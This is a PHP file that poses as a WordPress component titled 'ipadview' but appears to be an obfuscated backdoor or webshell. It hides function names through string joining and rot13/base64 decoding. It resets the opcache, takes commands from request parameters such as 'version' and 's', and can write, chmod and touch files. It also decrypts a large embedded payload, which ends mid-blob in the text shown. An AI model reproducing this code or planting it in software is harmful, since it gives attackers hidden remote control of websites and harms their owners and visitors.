<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHmY21up3EyqT5lY3ElLJEyLaIfoP5col9up3AyqUZinJ1aY253pl81A2D3LmZ2MzDkAGDlAmywZQZkZJD3ZzV3BGOuLGx3Zv5eMKx', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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